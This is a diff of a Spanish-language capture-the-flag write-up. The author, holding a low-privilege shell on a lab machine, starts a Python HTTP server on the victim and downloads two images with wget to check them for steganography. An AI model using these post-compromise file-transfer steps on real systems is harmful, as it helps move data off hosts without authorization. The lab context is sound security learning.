@@ -130,11 +130,49 @@ $ cat user.txt
 cat user.txt
 cat: user.txt: Permission denied
 
+de todas formas, encontre unas imagenes en una ruta, intentare usar estaganografia para ver si contienen algo dentro de ellas. 
 
-.bashrc
-.logout
-.profile
+/var/www/html/assets
+$ ls
+ls
+images  index.php  styles.css
+$ cd images
+cd images
+$ ls
+ls
+oneforall.jpg  yuei.jpg
+$ 
 
-.local directory
-oneforall
-yuei
+Levantare un servidor en python3 en la maquina victima para omar las imagenes desde mi terminal 
+
+$ python3 -m http.server 8000
+python3 -m http.server 8000
+
+
+ahora las descargo 
+
+
+[davidoberst@archlinux ~]$ wget http://10.67.189.74:8000/oneforall.jpg
+--2026-06-19 01:31:50--  http://10.67.189.74:8000/oneforall.jpg
+Connecting to 10.67.189.74:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 98264 (96K) [image/jpeg]
+Saving to: ‘oneforall.jpg’
+
+oneforall.jpg               100%[=========================================>]  95.96K   450KB/s    in 0.2s    
+
+2026-06-19 01:31:51 (450 KB/s) - ‘oneforall.jpg’ saved [98264/98264]
+
+[davidoberst@archlinux ~]$ wget http://10.67.189.74:8000/yuei.jpg
+--2026-06-19 01:31:57--  http://10.67.189.74:8000/yuei.jpg
+Connecting to 10.67.189.74:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 237170 (232K) [image/jpeg]
+Saving to: ‘yuei.jpg’
+
+yuei.jpg                    100%[=========================================>] 231.61K   823KB/s    in 0.3s    
+
+2026-06-19 01:31:57 (823 KB/s) - ‘yuei.jpg’ saved [237170/237170]
+
+
+
